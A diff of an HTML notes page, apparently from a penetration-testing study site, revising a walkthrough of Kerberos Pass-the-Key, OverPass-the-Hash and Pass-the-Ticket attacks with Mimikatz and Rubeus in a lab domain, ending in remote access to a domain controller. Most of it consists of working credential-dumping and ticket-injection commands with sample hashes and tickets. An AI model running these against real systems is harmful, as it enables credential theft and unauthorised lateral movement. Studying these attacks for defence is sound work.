@@ -17738,56 +17738,61 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>If running as Local admin it will dump all the tickets. <code>Rubeus dump</code>, instead of giving us a file, will print the ticket encoded in base64 format.</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>Rubeus.exe dump /nowrap
 </span></code></pre></div></td></tr></table></div>
+<p>Another interesting command:</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">dump</span> <span class="p">/</span><span class="n">extractkeys</span> <span class="p">/</span><span class="n">nowrap</span>
+</span></code></pre></div></td></tr></table></div>
 <h2 id="forge-your-own-tickets-with-pass-the-key-or-overpass-the-hash">Forge your own tickets with Pass the Key or OverPass the Hash</h2>
-<p>The <code>Pass the Key</code> or <code>OverPass the Hash</code> approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full <code>Ticket-Granting-Ticket (TGT)</code>.</p>
+<p>The traditional pass-the-hash technique involves reusing a hash through the NTLMv1/NTLMv2 protocol, which doesn't touch Kerberos at all. The <code>Pass the Key</code> or <code>OverPass the Hash</code> approach converts a hash/key (rc4_hmac, aes256_cts_hmac_sha1, etc.) for a domain-joined user into a full <code>Ticket-Granting-Ticket (TGT)</code>.</p>
 <p><strong>Note:</strong> Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.</p>
 <h3 id="mimikatz-pass-the-key-or-overpass-the-hash">Mimikatz  - Pass the Key or OverPass the Hash</h3>
 <p>It requires administrative rights.</p>
 <p><strong>1.</strong> Get hashes with sekurlsa::ekeys</p>
 <p>To forge our tickets, we need to have the user's hash; we can use Mimikatz to dump all users Kerberos encryption keys using the module <code>sekurlsa::ekeys</code>. This module will enumerate all key types present for the Kerberos package.</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span>
-<span class="normal"><a href="#__codelineno-2-2">2</a></span>
-<span class="normal"><a href="#__codelineno-2-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>mimikatz.exe
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a>privilege::debug
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>sekurlsa::ekeys
-</span></code></pre></div></td></tr></table></div>
-<p>Now that we have access to the <code>AES256_HMAC</code> and <code>RC4_HMAC</code> keys, we can perform the OverPass the Hash or Pass the Key attack using <code>Mimikatz</code> and <code>Rubeus</code>.</p>
-<p><strong>2.</strong> Pass the Key or OverPass the Hash</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span>
 <span class="normal"><a href="#__codelineno-3-2">2</a></span>
 <span class="normal"><a href="#__codelineno-3-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>mimikatz.exe
 </span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2"></a>privilege::debug
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a>sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3"></a>sekurlsa::ekeys
+</span></code></pre></div></td></tr></table></div>
+<p>Now that we have access to the <code>AES256_HMAC</code> and <code>RC4_HMAC</code> keys, we can perform the OverPass the Hash or Pass the Key attack using <code>Mimikatz</code> and <code>Rubeus</code>.</p>
+<p><strong>2.</strong> Pass the Key or OverPass the Hash</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span>
+<span class="normal"><a href="#__codelineno-4-2">2</a></span>
+<span class="normal"><a href="#__codelineno-4-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>mimikatz.exe
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2"></a>privilege::debug
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3"></a>sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
 </span></code></pre></div></td></tr></table></div>
 <p>This will create a new <code>cmd.exe</code> window that we can use to request access to any service we want in the context of the target user.</p>
 <h3 id="rubeus-pass-the-key-or-overpass-the-hash">Rubeus - Pass the Key or OverPass the Hash</h3>
 <p>It does not require administrative rights.</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-4-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1"></a>Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>Rubeus.exe  asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
 </span></code></pre></div></td></tr></table></div>
 <p>This is not the case, but if we would want to crack the ticket, we could use <a href="../kirbi2john/">kirbi2john</a> and hashcat to proceed.</p>
 <h2 id="pass-the-ticket-ptt-with-rubeus">Pass the Ticket (PtT) with Rubeus</h2>
 <p>Now that we have some Kerberos tickets, we can use them to move laterally within an environment.</p>
 <h3 id="with-ptt">With /ptt</h3>
 <p>With <code>Rubeus</code> we performed an OverPass the Hash attack and retrieved the ticket in base64 format. Instead, we could use the flag <code>/ptt</code> to submit the ticket (TGT or TGS) to the current logon session.</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-5-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1"></a>Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /rc4:3f74aa8f08f712f09cd5177b5c1ce50f /ptt
 </span></code></pre></div></td></tr></table></div>
 <h3 id="with-kirbi-file">With kirbi file</h3>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-6-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1"></a>Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a>Rubeus.exe ptt /ticket:[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi
 </span></code></pre></div></td></tr></table></div>
 <h3 id="with-kirbi-in-base64">With kirbi in base64</h3>
 <p>We can also use the base64 output from Rubeus or convert a .kirbi to base64 to perform the Pass the Ticket attack. We can use PowerShell to convert a .kirbi to base64.</p>
 <p>Convert .kirbi to Base64 Format: </p>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-7-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1"></a><span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="no">[IO.File]</span><span class="p">::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="s2">&quot;[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi&quot;</span><span class="p">))</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a><span class="no">[Convert]</span><span class="p">::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="no">[IO.File]</span><span class="p">::</span><span class="n">ReadAllBytes</span><span class="p">(</span><span class="s2">&quot;[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi&quot;</span><span class="p">))</span>
 </span></code></pre></div></td></tr></table></div>
 <p>Using Rubeus, we can perform a Pass the Ticket providing the base64 string instead of the file name.</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-8-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1"></a>Rubeus.exe ptt /ticket:doIE1jCCBNKgAwIBBaEDAgEWooID+TCCA/VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk/gHuER2XRLdV/&lt;SNIP&gt;
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">ptt</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">doIE1jCCBNKgAwIBBaEDAgEWooID</span><span class="p">+</span><span class="n">TCCA</span><span class="p">/</span><span class="n">VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk</span><span class="p">/</span><span class="n">gHuER2XRLdV</span><span class="p">/&lt;</span><span class="n">SNIP</span><span class="p">&gt;</span>
 </span></code></pre></div></td></tr></table></div>
 <h2 id="pass-the-ticket-ptt-with-mimikatz">Pass the Ticket (PtT) with mimikatz</h2>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-9-1">1</a></span>
-<span class="normal"><a href="#__codelineno-9-2">2</a></span>
-<span class="normal"><a href="#__codelineno-9-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1"></a>.\mimikatz.exe 
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2"></a>privilege::debug
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3"></a>kerberos::ptt &quot;C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi&quot;
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span>
+<span class="normal"><a href="#__codelineno-10-2">2</a></span>
+<span class="normal"><a href="#__codelineno-10-3">3</a></span>
+<span class="normal"><a href="#__codelineno-10-4">4</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="c">#  we can use Mimikatz to import our ticket</span>
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2"></a><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> 
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3"></a><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
+</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="s2">&quot;C:\Users\plaintext\Desktop\Mimikatz\[0;6c680]-2-0-40e10000-plaintext@krbtgt-inlanefreight.htb.kirbi&quot;</span>
 </span></code></pre></div></td></tr></table></div>
 <h2 id="pass-the-ticket-with-powershell-remoting-windows">Pass The Ticket with PowerShell Remoting (Windows)</h2>
 <p><a href="https://docs.microsoft.com/en-us/powershell/scripting/learn/remoting/running-remote-commands?view=powershell-7.2">PowerShell Remoting</a> allows us to run scripts or commands on a remote computer.  </p>
@@ -17798,46 +17803,65 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 - be a member of the Remote Management Users group, 
 - or have explicit PowerShell Remoting permissions in your session configuration.</p>
 <h3 id="with-mimikatz">With mimikatz</h3>
-<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-10-1">1</a></span>
-<span class="normal"><a href="#__codelineno-10-2">2</a></span>
-<span class="normal"><a href="#__codelineno-10-3">3</a></span>
-<span class="normal"><a href="#__codelineno-10-4">4</a></span>
-<span class="normal"><a href="#__codelineno-10-5">5</a></span>
-<span class="normal"><a href="#__codelineno-10-6">6</a></span>
-<span class="normal"><a href="#__codelineno-10-7">7</a></span>
-<span class="normal"><a href="#__codelineno-10-8">8</a></span>
-<span class="normal"><a href="#__codelineno-10-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1"></a><span class="c"># To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket</span>
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2"></a><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span>
-</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3"></a><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
-</span><span id="__span-10-4"><a id="__codelineno-10-4" name="__codelineno-10-4"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="s2">&quot;C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi&quot;</span>
-</span><span id="__span-10-5"><a id="__codelineno-10-5" name="__codelineno-10-5"></a><span class="n">exit</span>
-</span><span id="__span-10-6"><a id="__codelineno-10-6" name="__codelineno-10-6"></a>
-</span><span id="__span-10-7"><a id="__codelineno-10-7" name="__codelineno-10-7"></a><span class="c"># And then open a PowerShell console and connect to the target machine</span>
-</span><span id="__span-10-8"><a id="__codelineno-10-8" name="__codelineno-10-8"></a><span class="n">powershell</span>
-</span><span id="__span-10-9"><a id="__codelineno-10-9" name="__codelineno-10-9"></a><span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="n">DC01</span>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span>
+<span class="normal"><a href="#__codelineno-11-2">2</a></span>
+<span class="normal"><a href="#__codelineno-11-3">3</a></span>
+<span class="normal"><a href="#__codelineno-11-4">4</a></span>
+<span class="normal"><a href="#__codelineno-11-5">5</a></span>
+<span class="normal"><a href="#__codelineno-11-6">6</a></span>
+<span class="normal"><a href="#__codelineno-11-7">7</a></span>
+<span class="normal"><a href="#__codelineno-11-8">8</a></span>
+<span class="normal"><a href="#__codelineno-11-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a><span class="c"># To use PowerShell Remoting with Pass the Ticket, we can use Mimikatz to import our ticket</span>
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2"></a><span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span>
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3"></a><span class="n">privilege</span><span class="p">::</span><span class="n">debug</span>
+</span><span id="__span-11-4"><a id="__codelineno-11-4" name="__codelineno-11-4"></a><span class="n">kerberos</span><span class="p">::</span><span class="n">ptt</span> <span class="s2">&quot;C:\Users\Administrator.WIN01\Desktop\[0;1812a]-2-0-40e10000-john@krbtgt-INLANEFREIGHT.HTB.kirbi&quot;</span>
+</span><span id="__span-11-5"><a id="__codelineno-11-5" name="__codelineno-11-5"></a><span class="n">exit</span>
+</span><span id="__span-11-6"><a id="__codelineno-11-6" name="__codelineno-11-6"></a>
+</span><span id="__span-11-7"><a id="__codelineno-11-7" name="__codelineno-11-7"></a><span class="c"># And then open a PowerShell console and connect to the target machine</span>
+</span><span id="__span-11-8"><a id="__codelineno-11-8" name="__codelineno-11-8"></a><span class="n">powershell</span>
+</span><span id="__span-11-9"><a id="__codelineno-11-9" name="__codelineno-11-9"></a><span class="nb">Enter-PSSession</span> <span class="n">-ComputerName</span> <span class="n">DC01</span>
 </span></code></pre></div></td></tr></table></div>
 <h3 id="with-rubeus">With Rubeus</h3>
 <p><strong>1.</strong> Create a Sacrificial Process with Rubeus</p>
 <p>Rubeus has the option createnetonly, which creates a sacrificial process/logon session (Logon type 9).</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-11-1">1</a></span>
-<span class="normal"><a href="#__codelineno-11-2">2</a></span>
-<span class="normal"><a href="#__codelineno-11-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1"></a>Rubeus.exe createnetonly /program:&quot;C:\Windows\System32\cmd.exe&quot; /show
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2"></a>
-</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3"></a># The command above will open a new cmd window.
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span>
+<span class="normal"><a href="#__codelineno-12-2">2</a></span>
+<span class="normal"><a href="#__codelineno-12-3">3</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a>Rubeus.exe createnetonly /program:&quot;C:\Windows\System32\cmd.exe&quot; /show
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2"></a>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3"></a># The command above will open a new cmd window. The below commands will run on this new terminal window
 </span></code></pre></div></td></tr></table></div>
 <p><strong>2.</strong> Rubeus - Pass the Ticket for Lateral Movement</p>
 <p>Execute Rubeus to request a new TGT with the option /ptt to import the ticket into our current session:</p>
-<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-12-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1"></a>Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
-</span></code></pre></div></td></tr></table></div>
-<p><strong>3.</strong> Connect to the DC using PowerShell Remoting.</p>
 <div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-13-1">1</a></span>
-<span class="normal"><a href="#__codelineno-13-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a>powershell
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2"></a>Enter-PSSession -ComputerName DC01
+<span class="normal"><a href="#__codelineno-13-2">2</a></span>
+<span class="normal"><a href="#__codelineno-13-3">3</a></span>
+<span class="normal"><a href="#__codelineno-13-4">4</a></span>
+<span class="normal"><a href="#__codelineno-13-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1"></a># Extract keys. We did this in the Harvesting section
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2"></a>Rubeus.exe dump /nowrap
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3"></a>
+</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4"></a># Then pass the ticket
+</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5"></a>Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
+</span></code></pre></div></td></tr></table></div>
+<p>Another way to import the ticket:</p>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-14-1">1</a></span>
+<span class="normal"><a href="#__codelineno-14-2">2</a></span>
+<span class="normal"><a href="#__codelineno-14-3">3</a></span>
+<span class="normal"><a href="#__codelineno-14-4">4</a></span>
+<span class="normal"><a href="#__codelineno-14-5">5</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1"></a><span class="c"># Extract keys. We did this in the Harvesting section</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">dump</span> <span class="p">/</span><span class="n">nowrap</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3"></a>
+</span><span id="__span-14-4"><a id="__codelineno-14-4" name="__codelineno-14-4"></a><span class="c"># Then pass the ticket:</span>
+</span><span id="__span-14-5"><a id="__codelineno-14-5" name="__codelineno-14-5"></a><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">ptt</span> <span class="p">/</span><span class="n">ticket</span><span class="p">:</span><span class="n">doIE1jCCBNKgAwIBBaEDAgEWooID</span><span class="p">+</span><span class="n">TCCA</span><span class="p">/</span><span class="n">VhggPxMIID7aADAgEFoQkbB0hUQi5DT02iHDAaoAMCAQKhEzARGwZrcmJ0Z3QbB2h0Yi5jb22jggO7MIIDt6ADAgESoQMCAQKiggOpBIIDpY8Kcp4i71zFcWRgpx8ovymu3HmbOL4MJVCfkGIrdJEO0iPQbMRY2pzSrk</span><span class="p">/</span><span class="n">gHuER2XRLdV</span><span class="p">/&lt;</span><span class="n">SNIP</span><span class="p">&gt;</span>
+</span></code></pre></div></td></tr></table></div>
+<p><strong>3.</strong> Either with mimikatz or Rubeus, once we import the ticket we can connect to the DC using PowerShell Remoting.</p>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-15-1">1</a></span>
+<span class="normal"><a href="#__codelineno-15-2">2</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1"></a>powershell
+</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2"></a>Enter-PSSession -ComputerName DC01
 </span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
-    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-01-18T19:59:20+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-01-18</span></small></br>
+    <small>Last update: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-timeago"><span class="timeago" datetime="2025-01-19T22:33:25+00:00" locale="en"></span></span><span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_date">2025-01-19</span></small></br>
 
 
     <small>Created: January 18, 2025 19:59:20</small>
